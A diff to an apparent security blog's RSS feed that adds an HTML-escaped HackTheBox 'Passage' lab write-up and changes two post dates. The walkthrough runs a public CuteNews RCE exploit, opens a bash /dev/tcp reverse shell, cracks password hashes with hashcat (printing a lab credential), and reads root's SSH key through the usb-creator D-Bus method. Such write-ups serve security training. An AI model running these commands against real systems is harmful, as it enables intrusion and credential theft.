@@ -33,9 +33,113 @@
     </item>
     
     <item>
+      <title>HackTheBox - Passage Writeup</title>
+      <link>https://mohamed-elleuch.me/writeups/htb-passage/</link>
+      <pubDate>Sat, 06 Mar 2021 00:00:00 +0000</pubDate>
+      <guid>https://mohamed-elleuch.me/writeups/htb-passage/</guid>
+      <description>&lt;h1 id=&#34;p-stylecolorredinformation-gathering-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Information Gathering &lt;/p&gt;&lt;/h1&gt;
+&lt;h2 id=&#34;p-stylecolorgreennmap-scan-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Nmap scan &lt;/p&gt;&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;rustscan -a 10.10.10.206 -- -A -sC -sV&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Open 10.10.10.206:22
+Open 10.10.10.206:80
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+
+| ssh-hostkey: 
+|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
+|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
+|   256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)
+
+80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Passage News
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt; We have two ports open 
+	Port 22 : OpenSSH 7.2p2
+	Port 80 : Apache httpd 2.4.18
+&lt;/p&gt;
+&lt;h2 id=&#34;p-stylecolorgreenexploring-the-webserver-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Exploring the WebServer &lt;/p&gt;&lt;/h2&gt;
+&lt;p&gt;Let&amp;rsquo;s first add Passage.htb to our hosts file!&lt;/p&gt;
+&lt;p&gt;We can see that Fail2Ban is Implemented on the server! So no need to waste our time trying bruteforcing dirs and files&lt;/p&gt;
+&lt;img src=&#34;fail2ban.png&#34;&gt; 
+&lt;p&gt;What really catchs my eye is&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Powered by CuteNews&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;A simple search on google can reveal the default dir for CuteNews CMS which is /CuteNews/&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s see what we get!
+&lt;img src=&#34;cuteCMS.png&#34;&gt;
+Nice! We got the CMS version&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Powered by CuteNews 2.1.2&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s find a vulnerability related to this version!&lt;/p&gt;
+&lt;h1 id=&#34;p-stylecolorredinitial-foothold-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Initial Foothold &lt;/p&gt;&lt;/h1&gt;
+&lt;p&gt;Let&amp;rsquo;s see what searchsploit has for us!&lt;/p&gt;
+&lt;img src=&#34;Searchsploit.png&#34;&gt;
+&lt;p&gt;Let&amp;rsquo;s grab that juicy RCE python exploit&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;searchsploit -m php/webapps/48800.py
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;And run our script, We only need to provide &lt;b&gt;	http://passage.htb&lt;/b&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;python3 48800.py
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;foothold.png&#34;&gt;
+&lt;p&gt;And we&amp;rsquo;re on the box!&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s get a proper shell on the box!&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/bin/bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;IP&amp;gt;/&amp;lt;PORT&amp;gt; 0&amp;gt;&amp;amp;1&#39;&lt;/code&gt;&lt;/p&gt;
+&lt;img src=&#34;pwncat.png&#34;&gt;
+&lt;h1 id=&#34;p-stylecolorreduser-privescp&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;User Privesc&lt;/p&gt;&lt;/h1&gt;
+&lt;h2 id=&#34;p-stylecolorgreenpaul-user-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Paul user &lt;/p&gt;&lt;/h2&gt;
+&lt;p&gt;Going through the webserver config, I found an interesting directory&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/var/www/html/CuteNews/cdata/users&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Which seem to contain some juicy encoded informations&lt;/p&gt;
+&lt;img src=&#34;encoded.png&#34;&gt;
+&lt;p&gt;It looks like it&amp;rsquo;s Base64 encoded!
+Let&amp;rsquo;s decode it&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;a:1:{s:4:&amp;quot;name&amp;quot;;a:1:{s:5:&amp;quot;admin&amp;quot;;a:8:{s:2:&amp;quot;id&amp;quot;;s:10:&amp;quot;1592483047&amp;quot;;s:4:&amp;quot;name&amp;quot;;s:5:&amp;quot;admin&amp;quot;;s:3:&amp;quot;acl&amp;quot;;s:1:&amp;quot;1&amp;quot;;s:5:&amp;quot;email&amp;quot;;s:17:&amp;quot;nadav@passage.htb&amp;quot;;s:4:&amp;quot;pass&amp;quot;;s:64:&amp;quot;7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1&amp;quot;;s:3:&amp;quot;lts&amp;quot;;s:10:&amp;quot;1592487988&amp;quot;;s:3:&amp;quot;ban&amp;quot;;s:1:&amp;quot;0&amp;quot;;s:3:&amp;quot;cnt&amp;quot;;s:1:&amp;quot;2&amp;quot;;}}}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;a:1:{s:4:&amp;quot;name&amp;quot;;a:1:{s:10:&amp;quot;paul-coles&amp;quot;;a:9:{s:2:&amp;quot;id&amp;quot;;s:10:&amp;quot;1592483236&amp;quot;;s:4:&amp;quot;name&amp;quot;;s:10:&amp;quot;paul-coles&amp;quot;;s:3:&amp;quot;acl&amp;quot;;s:1:&amp;quot;2&amp;quot;;s:5:&amp;quot;email&amp;quot;;s:16:&amp;quot;paul@passage.htb&amp;quot;;s:4:&amp;quot;nick&amp;quot;;s:10:&amp;quot;Paul Coles&amp;quot;;s:4:&amp;quot;pass&amp;quot;;s:64:&amp;quot;e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd&amp;quot;;s:3:&amp;quot;lts&amp;quot;;s:10:&amp;quot;1592485556&amp;quot;;s:3:&amp;quot;ban&amp;quot;;s:1:&amp;quot;0&amp;quot;;s:3:&amp;quot;cnt&amp;quot;;s:1:&amp;quot;2&amp;quot;;}}}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Seems like we got nadav and paul&amp;rsquo;s hash password&lt;/p&gt;
+&lt;p&gt;It&amp;rsquo;s a sha2-256 hash, we&amp;rsquo;re gonna use Hashcat with the rockyou wordlist to crack them!&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;echo &amp;quot;7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1&amp;quot; &amp;gt; hash 
+echo &amp;quot;e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd&amp;quot; &amp;gt; hash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;hashcat -m 1400 hash /opt/rockyou.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Seems like we were only able to crack paul&amp;rsquo;s hash!&lt;/p&gt;
+&lt;img src=&#34;cracked.png&#34;&gt;
+&lt;p&gt;&lt;code&gt;paul:atlanta1&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;And grab our user flag&lt;/p&gt;
+&lt;h2 id=&#34;p-stylecolorgreennadav-user-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Nadav user &lt;/p&gt;&lt;/h2&gt;
+&lt;p&gt;We can notice that nadav can access paul&amp;rsquo;s session&lt;/p&gt;
+&lt;img src=&#34;ssh.png&#34;&gt;
+&lt;p&gt;Let&amp;rsquo;s see if paul&amp;rsquo;s can access nadav&amp;rsquo;s session&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;ssh nadav@passage
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;nadav.png&#34;&gt;
+&lt;p&gt;It worked!&lt;/p&gt;
+&lt;h1 id=&#34;p-stylecolorredroot-privescp&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Root Privesc&lt;/p&gt;&lt;/h1&gt;
+&lt;p&gt;Let&amp;rsquo;s first run&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;ps -aux
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;To see the current running processes!
+&lt;img src=&#34;usb.png&#34;&gt;
+What really catches me is that root is running, and that&amp;rsquo;s odd&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;/usr/bin/python3 /usr/share/usb-creator/usb-creator-helper
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;A bit a searching/reading from google can lead us to something, which is the ability to get any file we want!&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /dev/shm/id_rsa true
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;root1.png&#34;&gt;
+&lt;p&gt;And we rooted the box!&lt;/p&gt;
+&lt;h2 id=&#34;thanks-for-reading-hope-you-enjoyed-it&#34;&gt;Thanks for reading hope you enjoyed it!&lt;/h2&gt;
+</description>
+    </item>
+    
+    <item>
       <title>HackTheBox - Academy Writeup</title>
       <link>https://mohamed-elleuch.me/writeups/htb-academy/</link>
-      <pubDate>Sat, 27 Mar 2021 00:00:00 +0000</pubDate>
+      <pubDate>Sat, 27 Feb 2021 00:00:00 +0000</pubDate>
       <guid>https://mohamed-elleuch.me/writeups/htb-academy/</guid>
       <description>&lt;h1 id=&#34;p-stylecolorredinformation-gathering-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Information Gathering &lt;/p&gt;&lt;/h1&gt;
 &lt;h2 id=&#34;p-stylecolorgreennmap-scan-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Nmap scan &lt;/p&gt;&lt;/h2&gt;
@@ -126,7 +230,7 @@ After manually trying to switch to these users, it turns out to be cry0l1t3&amp;
     <item>
       <title>HackLock Active Directory Workshop Writeup</title>
       <link>https://mohamed-elleuch.me/writeups/hacklockad/</link>
-      <pubDate>Tue, 23 Mar 2021 00:00:00 +0000</pubDate>
+      <pubDate>Tue, 23 Feb 2021 00:00:00 +0000</pubDate>
       <guid>https://mohamed-elleuch.me/writeups/hacklockad/</guid>
       <description>&lt;h1 id=&#34;p-stylecolorredoverview-of-the-network-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Overview of the network &lt;/p&gt;&lt;/h1&gt;
 &lt;p&gt;&lt;img class=&#34;special-img-class&#34; src=&#34;archi.png
